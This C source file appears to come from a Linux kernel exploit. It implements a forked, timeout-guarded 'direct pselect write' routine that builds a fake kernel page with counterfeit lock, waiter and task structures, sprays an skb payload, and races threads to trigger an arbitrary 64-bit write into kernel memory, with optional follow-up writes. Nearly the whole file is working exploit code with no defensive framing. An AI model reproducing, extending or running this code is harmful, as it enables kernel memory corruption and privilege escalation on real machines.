#include "common.h"

#define DIRECT_WRITE_TIMEOUT_SEC 180

static uint64_t monotonic_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000ULL +
         (uint64_t)ts.tv_nsec / 1000000ULL;
}

static void kill_and_reap_group(pid_t child) {
  int saved_errno = errno;
  kill(-child, SIGKILL);
  kill(child, SIGKILL);
  for (;;) {
    pid_t got = waitpid(child, NULL, 0);
    if (got == child || (got < 0 && errno == ECHILD)) {
      break;
    }
    if (got < 0 && errno == EINTR) {
      continue;
    }
    break;
  }
  errno = saved_errno;
}

static int direct_pselect_write_once_internal(
    uintptr_t target, uintptr_t value, int shape, int idx,
    uintptr_t followup_target, int followup_idx) {
  if (shape < 0 || shape > 1) {
    errno = EINVAL;
    return 0;
  }

  pid_t expected_parent = getpid();
  pid_t child = fork();
  if (child < 0) {
    pr_warning("direct-w64[%d] fork failed errno=%d\n", idx, errno);
    return 0;
  }

  if (child == 0) {
    if (setpgid(0, 0) != 0) {
      _exit(10);
    }
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 ||
        getppid() != expected_parent) {
      _exit(11);
    }

    page_base = 0;
    fake_lock = 0;
    fake_w0 = 0;
    fake_task = 0;
    set_pselect_write(target, value, shape);

    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
      _exit(12);
    }

    uintptr_t heap_page = page_base;
    uintptr_t heap_lock = fake_lock;
    uintptr_t heap_w0 = fake_w0;
    uintptr_t heap_task = fake_task;

    /* Refresh the custom waiter/task layout without sending another skb. */
    if (!prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS) ||
        page_base != heap_page || fake_lock != heap_lock ||
        fake_w0 != heap_w0 || fake_task != heap_task) {
      _exit(13);
    }

    pr_success("direct-w64[%d] target=%016zx value=%016zx shape=%d "
               "workspace=%016zx\n",
               idx, target, value, shape, page_base);
    run_main_route_threads();

    int triggered = atomic_load(&route_done) &&
                    atomic_load(&consumer_calls) > 0 &&
                    atomic_load(&consumer_success) > 0;
    if (triggered && followup_target) {
      uintptr_t followup_value = page_base + 0x100;
      if ((followup_value & 0xff) != 0 ||
          ((followup_value >> 8) & 0xff) == 0 ||
          !is_direct_ptr(followup_value)) {
        _exit(14);
      }

      int followup_ok = 0;
      for (int attempt = 0; attempt < 3; attempt++) {
        if (direct_pselect_write_once(
                followup_target, followup_value, 1,
                followup_idx + attempt)) {
          followup_ok = 1;
          break;
        }
      }
      _exit(followup_ok ? 0 : 15);
    }
    _exit(triggered ? 0 : 16);
  }

  if (setpgid(child, child) != 0 && errno != EACCES && errno != ESRCH) {
    pr_warning("direct-w64[%d] parent setpgid failed child=%d errno=%d\n",
               idx, child, errno);
  }

  uint64_t deadline =
      monotonic_ms() + (uint64_t)DIRECT_WRITE_TIMEOUT_SEC * 1000ULL;
  int status = 0;
  for (;;) {
    pid_t got = waitpid(child, &status, WNOHANG);
    if (got == child) {
      break;
    }
    if (got < 0) {
      if (errno == EINTR) {
        continue;
      }
      kill_and_reap_group(child);
      return 0;
    }
    if (monotonic_ms() >= deadline) {
      pr_warning("direct-w64[%d] timeout child=%d seconds=%d\n",
                 idx, child, DIRECT_WRITE_TIMEOUT_SEC);
      kill_and_reap_group(child);
      errno = ETIMEDOUT;
      return 0;
    }
    usleep(10000);
  }

  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
    pr_warning("direct-w64[%d] child=%d status=0x%x\n", idx, child, status);
    return 0;
  }
  return 1;
}

int direct_pselect_write_once(
    uintptr_t target, uintptr_t value, int shape, int idx) {
  return direct_pselect_write_once_internal(
      target, value, shape, idx, 0, 0);
}

int direct_pselect_write_followup_once(
    uintptr_t target, uintptr_t value, int shape, int idx,
    uintptr_t followup_target, int followup_idx) {
  return direct_pselect_write_once_internal(
      target, value, shape, idx, followup_target, followup_idx);
}
